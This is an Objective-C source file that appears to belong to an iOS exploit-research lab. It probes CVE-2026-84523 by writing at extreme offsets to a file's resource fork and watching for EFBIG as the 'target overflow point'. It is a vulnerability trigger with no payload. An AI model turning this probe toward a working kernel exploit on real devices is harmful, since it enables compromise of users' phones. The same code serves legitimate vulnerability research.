#import "P052APFSNstream.h"
#import "LabLocalTime.h"
#import "LabRuntimeOffsets.h"
#import "A14_23F77_LabOffsets.h"

#import <Foundation/Foundation.h>
#import <fcntl.h>
#import <unistd.h>
#import <string.h>
#import <stdlib.h>
#import <errno.h>
#import <sys/attr.h>
#import <sys/xattr.h>
#import <sys/stat.h>
#import <stdarg.h>

#define P052_BUILD @"p052-nstream-extend-v3"

static int g_log_fd = -1;

static void p052_log(NSMutableString *buf, NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    [buf appendString:out];
    if (g_log_fd >= 0) {
        const char *s = out.UTF8String;
        if (s) {
            write(g_log_fd, s, strlen(s));
            fcntl(g_log_fd, F_FULLFSYNC);
        }
    }
}

@implementation P052APFSNstream

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *logPath = [docs stringByAppendingPathComponent:@"p052_nstream_log.txt"];
    g_log_fd = open([logPath UTF8String], O_CREAT | O_WRONLY | O_TRUNC, 0644);
    
    p052_log(log, @"=== p052 session BUILD %@ ===", P052_BUILD);
    p052_log(log, @"Target: CVE-2026-84523 (APFS nstream_write_extend)");
    p052_log(log, @"Device: %s", LabOff()->tag);
    
    // 1. Create test file
    NSString *testFile = [docs stringByAppendingPathComponent:@"p052_nstream_test"];
    int fd = open([testFile UTF8String], O_CREAT | O_RDWR | O_TRUNC, 0644);
    if (fd < 0) {
        p052_log(log, @"[-] Failed to create test file: %d", errno);
        return log;
    }
    write(fd, "AAAA", 4);
    
    // 2. Open Resource Fork
    NSString *rsrcPath = [testFile stringByAppendingPathComponent:@"..namedfork/rsrc"];
    int rsrcFd = open([rsrcPath UTF8String], O_RDWR | O_CREAT, 0644);
    if (rsrcFd < 0) {
        p052_log(log, @"[-] Failed to open resource fork: %d", errno);
        close(fd);
        return log;
    }
    write(rsrcFd, "RSRC", 4);
    
    // 3. Test offsets
    off_t test_offsets[] = {
        0x7FFFFFFFFFFFFFFFLL,
        0x7FFFFFFFFFFF0000LL,
        0x7FFFFFFF00000000LL,
        0x0000FFFFFFFFFFFFLL,
        0x00000000FFFFFFFFLL,
        0x0000000000000001LL,
        -1LL
    };
    
    for (int i = 0; i < (int)(sizeof(test_offsets)/sizeof(test_offsets[0])); i++) {
        off_t off = test_offsets[i];
        p052_log(log, @"[*] Testing offset: %lld", (long long)off);
        
        if (lseek(rsrcFd, off, SEEK_SET) < 0) {
            p052_log(log, @"  lseek failed: %d", errno);
            continue;
        }
        
        char buf[1024];
        memset(buf, 0x42, sizeof(buf));
        ssize_t wr = write(rsrcFd, buf, sizeof(buf));
        p052_log(log, @"  write(%zu) at %lld -> %zd (errno %d)",
                   sizeof(buf), (long long)off, wr, errno);
        
        if (wr < 0 && errno == EFBIG) {
            p052_log(log, @"  ★ EFBIG hit! This is the target overflow point. ★");
        }
    }
    
    close(rsrcFd);
    close(fd);
    unlink([testFile UTF8String]);
    
    p052_log(log, @"=== p052 complete ===");
    if (g_log_fd >= 0) {
        fcntl(g_log_fd, F_FULLFSYNC);
        close(g_log_fd);
        g_log_fd = -1;
    }
    
    return log;
}

@end
